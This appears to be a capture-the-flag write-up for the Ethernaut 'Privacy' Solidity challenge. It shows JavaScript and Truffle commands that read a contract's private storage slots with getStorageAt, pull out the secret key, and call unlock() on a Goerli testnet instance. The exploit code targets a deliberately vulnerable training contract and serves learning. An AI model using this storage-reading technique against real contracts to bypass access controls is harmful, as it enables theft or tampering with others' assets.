# Privacy

[Privacy](https://ethernaut.openzeppelin.com/level/0xcAac6e4994c2e21C5370528221c226D1076CfDAB)

Storing of secrets in state variables. Attack by extracting secret using `getStorageAt`.


Contract Address: <BR />
``0xDEEA75B0312e042cCD2679574693A19518C930fa``

<BR />


## Test Attack

```JS
//Identifying storage location using this test array data
//0x1234567890123456789012345678901234567890123456789012345678901234
//0x2222222222222222222222222222222222222222222222222222222222222222
//0x5678222334455667788995678222334455667788995678222334455667788991

pr = await Privacy.deployed()

await web3.eth.getStorageAt(pr.address, 0)
//'0x0000000000000000000000000000000000000000000000000000000000000001'

await web3.eth.getStorageAt(pr.address, 1)
//'0x00000000000000000000000000000000000000000000000000000000647f40c2'

await web3.eth.getStorageAt(pr.address, 2)
//'0x0000000000000000000000000000000000000000000000000000000040c2ff0a'

await web3.eth.getStorageAt(pr.address, 3)
//'0x1234567890123456789012345678901234567890123456789012345678901234'

await web3.eth.getStorageAt(pr.address, 4)
//'0x2222222222222222222222222222222222222222222222222222222222222222'

await web3.eth.getStorageAt(pr.address, 5)
//'0x5678222334455667788995678222334455667788995678222334455667788991'

// Break into two to confirm which half we need
//0x56782223344556677889956782223344
//0x55667788995678222334455667788991

await pr.locked()
await pr.unlock("0x56782223344556677889956782223344")
await pr.locked()
```

<BR />

## Live Attack

```BASH
truffle console --network goerli
```

```JS
pr = await Privacy.at('0xDEEA75B0312e042cCD2679574693A19518C930fa')

await web3.eth.getStorageAt(pr.address, 5)
// 0xe3a394eecab4c8ffae01de0571717a45
// 0x67da3002e806f12d14ba2f59cfb64b71

await pr.locked()
await pr.unlock("0xe3a394eecab4c8ffae01de0571717a45")
await pr.locked()
```
